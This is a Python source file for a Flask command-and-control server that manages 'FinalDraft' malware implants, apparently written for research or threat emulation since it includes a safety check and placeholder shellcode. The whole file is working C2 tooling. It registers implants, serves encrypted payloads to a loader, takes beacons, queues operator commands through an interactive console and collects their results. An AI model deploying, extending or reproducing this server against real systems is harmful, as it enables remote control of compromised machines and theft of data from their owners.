"""
FinalFinal C2 Server
Command and Control server for managing FinalDraft implants
"""

import sys
import argparse
import json
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional
from flask import Flask, request, jsonify, send_file

import config
import utils

logger = utils.setup_logging("C2Server")

# Flask app
app = Flask(__name__)

# Global state
implants: Dict[str, Dict] = {}
commands_queue: Dict[str, List] = {}


class C2Server:
    """
    C2 Server for FinalDraft implants
    Manages implant registration, command dispatch, and data exfiltration
    """
    
    def __init__(self, host: str, port: int):
        """
        Initialize C2 server
        
        Args:
            host: Server host address
            port: Server port
        """
        self.host = host
        self.port = port
        
        logger.info(f"C2 Server initialized on {host}:{port}")
    
    def start(self):
        """Start the C2 server"""
        utils.print_banner()
        utils.print_info("Starting C2 Server...")
        
        # Safety check
        utils.check_safety_mode()
        
        utils.print_success(f"C2 Server listening on {self.host}:{self.port}")
        utils.print_info("Endpoints:")
        utils.print_info("  POST /register - Implant registration")
        utils.print_info("  GET  /payload - Download encrypted payload")
        utils.print_info("  POST /beacon - Receive implant beacons")
        utils.print_info("  GET  /command/<implant_id> - Get commands for implant")
        utils.print_info("  POST /result - Receive command results")
        utils.print_info("  GET  /implants - List all implants")
        utils.print_info("")
        utils.print_info("Press Ctrl+C to stop")
        
        try:
            app.run(host=self.host, port=self.port, debug=False)
        except KeyboardInterrupt:
            utils.print_warning("Received interrupt signal")
            self.stop()
    
    def stop(self):
        """Stop the C2 server"""
        logger.info("Stopping C2 Server...")
        utils.print_info("C2 Server stopped")


# ============================================================================
# FLASK ROUTES
# ============================================================================

@app.route('/register', methods=['POST'])
def register_implant():
    """Register a new implant"""
    try:
        data = request.get_json()
        
        implant_id = data.get('implant_id')
        stage = data.get('stage')
        system_info = data.get('system_info', {})
        
        if not implant_id:
            return jsonify({'error': 'Missing implant_id'}), 400
        
        # Store implant info
        implants[implant_id] = {
            'implant_id': implant_id,
            'stage': stage,
            'system_info': system_info,
            'registered_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'beacon_count': 0
        }
        
        # Initialize command queue
        commands_queue[implant_id] = []
        
        logger.info(f"New implant registered: {implant_id} (stage: {stage})")
        utils.print_success(f"Implant registered: {implant_id}")
        
        return jsonify({
            'status': 'success',
            'implant_id': implant_id,
            'message': 'Implant registered successfully'
        }), 200
        
    except Exception as e:
        logger.error(f"Error in register_implant: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/payload', methods=['GET'])
def get_payload():
    """Serve encrypted payload to PathLoader"""
    try:
        implant_id = request.headers.get('X-Implant-ID')
        
        logger.info(f"Payload request from implant: {implant_id}")
        
        # Check if payload exists
        payload_path = config.PAYLOADS_DIR / 'payload.bin'
        
        if not utils.file_exists(payload_path):
            logger.warning("Payload file not found, generating demo payload...")
            
            # Generate demo payload on-the-fly
            demo_shellcode = b"DEMO_SHELLCODE_FOR_RESEARCH_PURPOSES"
            encrypted_data, iv = utils.encrypt_data(demo_shellcode)
            payload = iv + encrypted_data
            
            # Save for future requests
            utils.write_file_bytes(payload_path, payload)
        
        logger.info(f"Serving payload: {payload_path}")
        return send_file(payload_path, mimetype='application/octet-stream')
        
    except Exception as e:
        logger.error(f"Error in get_payload: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/beacon', methods=['POST'])
def receive_beacon():
    """Receive beacon from implant"""
    try:
        data = request.get_json()
        
        implant_id = data.get('implant_id')
        beacon_count = data.get('beacon_count', 0)
        components = data.get('components', {})
        
        if not implant_id:
            return jsonify({'error': 'Missing implant_id'}), 400
        
        # Update implant info
        if implant_id in implants:
            implants[implant_id]['last_seen'] = datetime.now().isoformat()
            implants[implant_id]['beacon_count'] = beacon_count
            implants[implant_id]['components'] = components
        
        logger.debug(f"Beacon received from {implant_id} (#{beacon_count})")
        
        # Check for pending commands
        pending_commands = commands_queue.get(implant_id, [])
        
        if pending_commands:
            # Return next command
            command = pending_commands.pop(0)
            logger.info(f"Dispatching command to {implant_id}: {command['cmd']}")
            
            return jsonify({
                'status': 'command',
                'command': command
            }), 200
        else:
            # No commands, just acknowledge
            return jsonify({
                'status': 'ok',
                'message': 'Beacon received'
            }), 200
        
    except Exception as e:
        logger.error(f"Error in receive_beacon: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/command/<implant_id>', methods=['GET'])
def get_commands(implant_id: str):
    """Get pending commands for an implant"""
    try:
        if implant_id not in implants:
            return jsonify({'error': 'Implant not found'}), 404
        
        pending_commands = commands_queue.get(implant_id, [])
        
        return jsonify({
            'implant_id': implant_id,
            'commands': pending_commands
        }), 200
        
    except Exception as e:
        logger.error(f"Error in get_commands: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/result', methods=['POST'])
def receive_result():
    """Receive command execution result from implant"""
    try:
        data = request.get_json()
        
        implant_id = data.get('implant_id')
        command_id = data.get('command_id')
        result = data.get('result')
        
        if not implant_id:
            return jsonify({'error': 'Missing implant_id'}), 400
        
        logger.info(f"Result received from {implant_id} for command {command_id}")
        logger.debug(f"Result: {result}")
        
        # Store result (in real scenario, would save to database)
        utils.print_success(f"Result from {implant_id}: {result}")
        
        return jsonify({
            'status': 'success',
            'message': 'Result received'
        }), 200
        
    except Exception as e:
        logger.error(f"Error in receive_result: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/implants', methods=['GET'])
def list_implants():
    """List all registered implants"""
    try:
        return jsonify({
            'count': len(implants),
            'implants': list(implants.values())
        }), 200
        
    except Exception as e:
        logger.error(f"Error in list_implants: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'implants': len(implants)
    }), 200


# ============================================================================
# INTERACTIVE CONSOLE
# ============================================================================

def interactive_console():
    """Interactive console for C2 operations"""
    utils.print_info("C2 Interactive Console")
    utils.print_info("Commands: list, interact <id>, command <id> <cmd>, exit")
    
    while True:
        try:
            cmd = input(f"\n{utils.Fore.CYAN}C2> {utils.Style.RESET_ALL}").strip()
            
            if not cmd:
                continue
            
            parts = cmd.split()
            action = parts[0].lower()
            
            if action == 'exit':
                break
            elif action == 'list':
                print(f"\n{utils.Fore.GREEN}Active Implants:{utils.Style.RESET_ALL}")
                for implant_id, info in implants.items():
                    print(f"  {implant_id}: {info['stage']} - Last seen: {info['last_seen']}")
            elif action == 'interact' and len(parts) > 1:
                implant_id = parts[1]
                if implant_id in implants:
                    print(f"\n{utils.Fore.GREEN}Implant: {implant_id}{utils.Style.RESET_ALL}")
                    print(json.dumps(implants[implant_id], indent=2))
                else:
                    print(f"{utils.Fore.RED}Implant not found{utils.Style.RESET_ALL}")
            elif action == 'command' and len(parts) > 2:
                implant_id = parts[1]
                command = parts[2]
                if implant_id in implants:
                    commands_queue[implant_id].append({'cmd': command, 'args': {}})
                    print(f"{utils.Fore.GREEN}Command queued for {implant_id}{utils.Style.RESET_ALL}")
                else:
                    print(f"{utils.Fore.RED}Implant not found{utils.Style.RESET_ALL}")
            else:
                print(f"{utils.Fore.YELLOW}Unknown command{utils.Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"{utils.Fore.RED}Error: {e}{utils.Style.RESET_ALL}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="FinalFinal C2 Server"
    )
    parser.add_argument(
        '--host',
        default=config.C2_HOST,
        help=f"Server host (default: {config.C2_HOST})"
    )
    parser.add_argument(
        '--port',
        type=int,
        default=config.C2_PORT,
        help=f"Server port (default: {config.C2_PORT})"
    )
    parser.add_argument(
        '--verbose',
        '-v',
        action='store_true',
        help="Enable verbose logging"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel("DEBUG")
    
    # Create and start C2 server
    server = C2Server(args.host, args.port)
    server.start()


if __name__ == "__main__":
    main()
